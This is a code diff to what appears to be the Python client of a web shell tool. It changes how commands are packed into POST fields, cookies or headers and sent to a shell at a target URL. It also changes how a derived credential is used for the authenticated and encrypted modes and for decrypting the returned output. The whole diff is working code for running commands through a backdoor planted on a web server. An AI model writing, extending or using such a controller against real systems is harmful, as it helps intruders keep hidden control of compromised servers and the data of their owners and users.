@@ -46,20 +46,21 @@ def validate(shell: WebShell) -> None:
         raise ValueError(f"{shell.mode} mode requires a secret")
 
 
-def _build_request(shell: WebShell, command: str) -> urllib.request.Request:
+def _build_request(shell: WebShell, command: str, credential: str) -> urllib.request.Request:
     """Build the transport request for ``command`` on this shell's vector/mode."""
-    payload = crypto.encrypt(command, shell.secret) if shell.mode == "encrypted" else command
+    payload = crypto.encrypt(command, credential) if shell.mode == "encrypted" else command
     value = encoding.encode(payload)
-    credential = (
-        encoding.encode(shell.secret)
+    
+    encCredential = (
+        encoding.encode(credential)
         if shell.mode in ("auth", "encrypted")
         else None
     )
 
     if shell.vector == "post":
         fields = {contract.PARAM_NAMES["post"]: value}
-        if credential is not None:
-            fields[contract.AUTH_PARAM_NAMES["post"]] = credential
+        if encCredential is not None:
+            fields[contract.AUTH_PARAM_NAMES["post"]] = encCredential
         data = urllib.parse.urlencode(fields).encode("ascii")
         return urllib.request.Request(
             shell.url,
@@ -70,13 +71,13 @@ def _build_request(shell: WebShell, command: str) -> urllib.request.Request:
 
     if shell.vector == "cookie":
         cookie = f"{contract.PARAM_NAMES['cookie']}={value}"
-        if credential is not None:
-            cookie += f"; {contract.AUTH_PARAM_NAMES['cookie']}={credential}"
+        if encCredential is not None:
+            cookie += f"; {contract.AUTH_PARAM_NAMES['cookie']}={encCredential}"
         return urllib.request.Request(shell.url, headers={"Cookie": cookie}, method="GET")
 
     headers = {contract.PARAM_NAMES["header"]: value}
-    if credential is not None:
-        headers[contract.AUTH_PARAM_NAMES["header"]] = credential
+    if encCredential is not None:
+        headers[contract.AUTH_PARAM_NAMES["header"]] = encCredential
     return urllib.request.Request(shell.url, headers=headers, method="GET")
 
 
@@ -94,7 +95,8 @@ def run(
 ) -> ShellResult:
     """Send ``command`` to ``shell`` and return its (decrypted) output."""
     validate(shell)
-    request = _build_request(shell, command)
+    credential = crypto.getCredential(shell.secret) if shell.secret else ""
+    request = _build_request(shell, command, credential)
 
     try:
         with urllib.request.urlopen(request, timeout=timeout) as response:
@@ -127,7 +129,7 @@ def run(
 
     if shell.mode == "encrypted":
         try:
-            output = crypto.decrypt(framed, shell.secret)
+            output = crypto.decrypt(framed, credential)
         except ValueError as exc:
             return ShellResult(
                 success=False,
